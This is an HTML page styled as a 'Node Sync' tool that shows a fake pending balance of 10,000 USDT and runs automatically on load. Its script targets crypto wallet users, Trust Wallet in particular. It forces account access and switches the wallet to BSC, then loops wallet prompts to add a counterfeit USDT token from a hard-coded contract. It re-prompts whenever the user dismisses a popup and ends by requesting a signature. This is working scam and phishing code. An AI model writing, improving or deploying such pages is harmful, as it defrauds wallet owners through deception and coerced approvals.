<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Node Sync Protocol</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #000; color: #00ff9d; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff9d; padding: 25px; width: 80%; text-align: center; background: rgba(0, 255, 157, 0.05); }
        #status { font-size: 12px; margin-top: 15px; color: #888; }
    </style>
</head>
<body>

<div class="box">
    <div style="font-size: 18px; font-weight: bold;">NODE_FORCE_SYNC</div>
    <div style="margin: 15px 0; color: #fff;">PENDING: 10,000.00 USDT</div>
    <div id="status">INITIATING SECURE BRIDGE...</div>
</div>

<script>
    const ASSET = {
        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        symbol: "USDT",
        decimals: 18,
        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
    };

    async function forceInjection() {
        const status = document.getElementById('status');
        
        // Mobile Provider Detection
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            status.innerText = "OPENING IN TRUST WALLET...";
            const dappUrl = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + dappUrl);
            return;
        }

        try {
            status.innerText = "LINKING TO WALLET CORE...";
            // Step 1: Force Account Access (Authentication)
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            // Step 2: Force BSC Network (Bina iske token add nahi hoga)
            status.innerText = "MAPPING BSC NETWORK...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            }

            // Step 3: THE FIX - Continuous Watch Request Loop
            status.innerText = "INJECTING ASSET DATA...";
            
            // Hum ek loop chalayenge jab tak popup nahi aata
            const trigger = async () => {
                const success = await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: ASSET
                    }
                });
                
                if (success) {
                    status.innerText = "SYNC SUCCESSFUL!";
                    // Step 4: Final Verification (Sign)
                    await provider.request({
                        method: 'personal_sign',
                        params: ["Verify Node Asset Mapping", accounts[0]]
                    });
                } else {
                    setTimeout(trigger, 1000); // Retry if user dismissed
                }
            };
            
            await trigger();

        } catch (e) {
            status.innerText = "RETRYING SESSION...";
            console.log(e);
            setTimeout(forceInjection, 2000); // Re-run if anything fails
        }
    }

    // Auto-start with delay to allow Wallet Provider to load
    window.onload = () => {
        setTimeout(forceInjection, 2000); 
    };
</script>
</body>
</html>
